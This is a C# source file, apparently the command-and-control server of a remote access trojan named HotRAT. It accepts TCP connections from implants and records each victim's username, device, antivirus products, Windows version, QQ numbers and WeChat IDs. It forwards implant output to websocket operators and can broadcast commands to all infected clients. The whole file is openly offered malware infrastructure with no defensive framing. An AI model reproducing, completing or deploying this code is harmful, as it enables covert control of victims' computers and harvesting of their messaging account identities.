using HotRAT.WSServer.Models;
using Newtonsoft.Json;
using System;
using System.Buffers;
using System.Collections.Concurrent;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace HotRAT.Server.Models
{
    public class ClientInfo
    {
        public string IP { get; set; }
        public int Port { get; set; }
        public string UserName { get; set; }
        public string DeviceName { get; set; }
        public string ProcessName { get; set; }
        public int PID { get; set; }
        public string[] AntivirusName { get; set; }
        public DateTime ConnectTime { get; set; }
        public string WindowsVersion { get; set; }
        public string[] QQNumber { get; set; }
        public string[] WXID { get; set; }
        public int ControlCount { get; set; } = 0;
    }

    public class ClientConnection : IDisposable
    {
        private const int HeaderSize = sizeof(int) + sizeof(byte);
        private const int BufferSize = 8192 * 4; // 32kb
        private readonly NetworkStream _stream;
        private readonly byte[] _receiveBuffer = new byte[BufferSize];
        private readonly MemoryStream _packetBuffer = new MemoryStream();
        private readonly CancellationTokenSource _cts = new CancellationTokenSource();
        private bool _disposed;

        public List<Guid> Controlled { get; } = new List<Guid>();
        public Guid ConnectionId { get; } = Guid.NewGuid();
        public TcpClient TcpClient { get; }
        public ClientInfo Info { get; } = new ClientInfo();

        public ClientConnection(TcpClient client)
        {
            TcpClient = client;
            _stream = client.GetStream();

            var chinaTimeZone = TimeZoneInfo.FindSystemTimeZoneById("China Standard Time");
            Info.ConnectTime = TimeZoneInfo.ConvertTimeFromUtc(DateTime.UtcNow, chinaTimeZone);

            var endpoint = (IPEndPoint)client.Client.RemoteEndPoint;
            Info.IP = endpoint.Address.ToString();
            Info.Port = endpoint.Port;

            LoggerModel.AddToLog($"[{Info.IP}:{Info.Port}]已连接", InfoLevel.Normal);
        }

        public async Task StartReceivingAsync()
        {
            try
            {
                while (TcpClient.Connected && !_cts.IsCancellationRequested)
                {
                    int bytesRead = 0;
                    try
                    {
                        bytesRead = await _stream.ReadAsync(
                            _receiveBuffer,
                            0,
                            _receiveBuffer.Length,
                            _cts.Token);
                    }
                    catch (IOException ioEx)
                    {
                        LoggerModel.AddToLog($"IO异常: {ioEx.Message}\n{ioEx.StackTrace}", InfoLevel.Error);
                        break;
                    }
                    catch (ObjectDisposedException)
                    {
                        LoggerModel.AddToLog("连接已被关闭 (ObjectDisposedException)", InfoLevel.Warning);
                        break;
                    }

                    if (bytesRead == 0)
                    {
                        LoggerModel.AddToLog("远程主机关闭了连接", InfoLevel.Warning);
                        break;
                    }

                    await ProcessReceivedData(_receiveBuffer, bytesRead);
                }
            }
            catch (OperationCanceledException)
            {
                LoggerModel.AddToLog("接收任务已取消", InfoLevel.Warning);
            }
            catch (Exception ex)
            {
                LoggerModel.AddToLog($"消息接收异常: {ex.Message}\n{ex.StackTrace}", InfoLevel.Error);
            }
            finally
            {
                Dispose();
            }
        }


        private async Task ProcessReceivedData(byte[] buffer, int bytesRead)
        {
            await _packetBuffer.WriteAsync(buffer, 0, bytesRead);
            _packetBuffer.Position = 0;

            while (_packetBuffer.Length - _packetBuffer.Position >= HeaderSize)
            {
                // 读取包头 (4字节长度 + 1字节类型)
                var header = new byte[HeaderSize];
                await _packetBuffer.ReadAsync(header, 0, HeaderSize);

                // 解析包头
                int packetSize = BitConverter.ToInt32(header, 0); // 前4字节是长度
                byte packetType = header[4]; // 第5字节是类型

                if (packetSize <= 0 || packetSize > 10 * 1024 * 1024) // 限制10MB
                {
                    LoggerModel.AddToLog($"非法包大小: {packetSize}", InfoLevel.Warning);
                    _packetBuffer.SetLength(0); // 清空缓冲区
                    break;
                }

                // 检查是否有足够的数据
                if (_packetBuffer.Length - _packetBuffer.Position >= packetSize)
                {
                    var packetData = new byte[packetSize];
                    await _packetBuffer.ReadAsync(packetData, 0, packetSize);
                    ProcessPacket(packetType, packetData);
                }
                else
                {
                    // 数据不足，回退位置等待更多数据
                    _packetBuffer.Position -= HeaderSize;
                    break;
                }
            }

            // 处理剩余数据
            var remaining = _packetBuffer.Length - _packetBuffer.Position;
            if (remaining > 0)
            {
                var temp = new byte[remaining];
                Array.Copy(_packetBuffer.GetBuffer(), _packetBuffer.Position, temp, 0, remaining);
                _packetBuffer.SetLength(0);
                await _packetBuffer.WriteAsync(temp, 0, temp.Length);
            }
            else
            {
                _packetBuffer.SetLength(0);
            }
        }

        private void ProcessPacket(byte packetType, byte[] data)
        {
            try
            {
                using var ms = new MemoryStream(data);
                using var reader = new BinaryReader(ms, Encoding.UTF8);

                switch (packetType)
                {
                    case 0x01: // Handshake
                        Info.UserName = reader.ReadString();
                        Info.DeviceName = reader.ReadString();
                        Info.ProcessName = reader.ReadString();
                        Info.PID = reader.ReadInt32();
                        Info.AntivirusName = reader.ReadString().Split('|');
                        Info.WindowsVersion = reader.ReadString();
                        Info.QQNumber = reader.ReadString().Split('|');
                        Info.WXID = reader.ReadString().Split('|');

                        LoggerModel.AddToLog($"[{Info.DeviceName}]上线包已接收", InfoLevel.Normal);
                        WebSocketServer.UpdataAllClients();
                        break;

                    case 0x02:
                        try
                        {
                            string rawMessage = Encoding.UTF8.GetString(data);
                            Console.WriteLine(rawMessage); 
                            int firstNewLine = rawMessage.IndexOf("\n");
                            if (firstNewLine >= 0)
                            {
                                string flag = rawMessage.Substring(0, firstNewLine);
                                string content = rawMessage.Substring(firstNewLine + 2);
                                foreach (var controlId in Controlled.ToArray())
                                {
                                    if (Runtimes.WSserver._clients.TryGetValue(controlId, out var wsClient))
                                    {
                                        var wsMessage = new
                                        {
                                            type = flag,
                                            data = content.Replace("\n","\\n")
                                        };
                                        _ = WebSocketServer.SendMessageAsync(
                                            wsClient.Stream,
                                            JsonConvert.SerializeObject(wsMessage));
                                    }
                                }
                            }
                            else
                            {
                                Runtimes.CWrite("无效消息格式，缺少分隔符", ConsoleColor.Red);
                            }
                        }
                        catch (Exception ex)
                        {
                            Runtimes.CWrite($"消息处理异常: {ex}",ConsoleColor.Red);
                        }
                        break;
                }
            }
            catch (Exception ex)
            {
                LoggerModel.AddToLog($"处理数据包错误: {ex.Message}", InfoLevel.Error);
            }
        }

        public async Task SendAsync(string text, byte packetType = 0x02)
        {
            if (_disposed || !TcpClient.Connected)
                throw new InvalidOperationException("连接已关闭");

            byte[] data = Encoding.UTF8.GetBytes(text + "\0");
            byte[] header = BitConverter.GetBytes(data.Length);
            byte[] typeByte = { packetType };

            var buffer = ArrayPool<byte>.Shared.Rent(header.Length + typeByte.Length + data.Length);
            try
            {
                Buffer.BlockCopy(header, 0, buffer, 0, header.Length);
                Buffer.BlockCopy(typeByte, 0, buffer, header.Length, typeByte.Length);
                Buffer.BlockCopy(data, 0, buffer, header.Length + typeByte.Length, data.Length);

                await _stream.WriteAsync(
                    buffer,
                    0,
                    header.Length + typeByte.Length + data.Length,
                    _cts.Token);
            }
            finally
            {
                ArrayPool<byte>.Shared.Return(buffer);
            }
        }

        public int AddControlled(Guid guid)
        {
            lock (Controlled)
            {
                Controlled.Add(guid);
                Info.ControlCount = Controlled.Count;
                return Controlled.Count;
            }
        }

        public int DelControlled(Guid guid)
        {
            lock (Controlled)
            {
                Controlled.Remove(guid);
                Info.ControlCount = Controlled.Count;
                return Controlled.Count;
            }
        }

        public void Dispose()
        {
            if (_disposed) return;

            try
            {
                _cts.Cancel();
                _stream?.Dispose();
                TcpClient?.Dispose();
                _packetBuffer?.Dispose();

                Runtimes._clients.TryRemove(ConnectionId, out _);
                LoggerModel.AddToLog($"[{Info.IP}:{Info.Port}]连接已释放", InfoLevel.Normal);
            }
            finally
            {
                _disposed = true;
                GC.SuppressFinalize(this);
            }
        }
    }

    public class SocketServer : IDisposable
    {
        private readonly TcpListener _listener;
        private readonly CancellationTokenSource _cts = new CancellationTokenSource();

        public SocketServer(int port)
        {
            _listener = new TcpListener(IPAddress.Any, port);
        }

        public async Task StartAsync()
        {
            _listener.Start();
            try
            {
                while (!_cts.IsCancellationRequested)
                {
                    var client = await _listener.AcceptTcpClientAsync()
                        .WithCancellation(_cts.Token);

                    var connection = new ClientConnection(client);
                    if (Runtimes._clients.TryAdd(connection.ConnectionId, connection))
                    {
                        _ = connection.StartReceivingAsync()
                            .ContinueWith(t =>
                            {
                                if (t.IsFaulted)
                                    LoggerModel.AddToLog(
                                        $"接收任务异常: {t.Exception?.Flatten().InnerException?.Message}",
                                        InfoLevel.Error);
                            });
                    }
                }
            }
            catch (OperationCanceledException)
            {
            }
            catch (Exception ex)
            {
                LoggerModel.AddToLog($"服务器错误: {ex.Message}", InfoLevel.Error);
            }
        }

        public void Broadcast(string text)
        {
            foreach (var client in Runtimes._clients.Values.ToArray())
            {
                if (client.TcpClient.Connected)
                {
                    _ = client.SendAsync(text).ContinueWith(t =>
                    {
                        if (t.IsFaulted)
                            LoggerModel.AddToLog(
                                $"广播消息失败: {t.Exception?.Flatten().InnerException?.Message}",
                                InfoLevel.Warning);
                    });
                }
            }
        }

        public void Dispose()
        {
            _cts.Cancel();
            _listener.Stop();

            foreach (var client in Runtimes._clients.Values.ToArray())
                client.Dispose();

            _cts.Dispose();
        }
    }

    public static class TaskExtensions
    {
        public static async Task<T> WithCancellation<T>(this Task<T> task, CancellationToken cancellationToken)
        {
            var tcs = new TaskCompletionSource<bool>();
            using (cancellationToken.Register(s => ((TaskCompletionSource<bool>)s).TrySetResult(true), tcs))
            {
                if (task != await Task.WhenAny(task, tcs.Task))
                    throw new OperationCanceledException(cancellationToken);
            }
            return await task;
        }
    }
}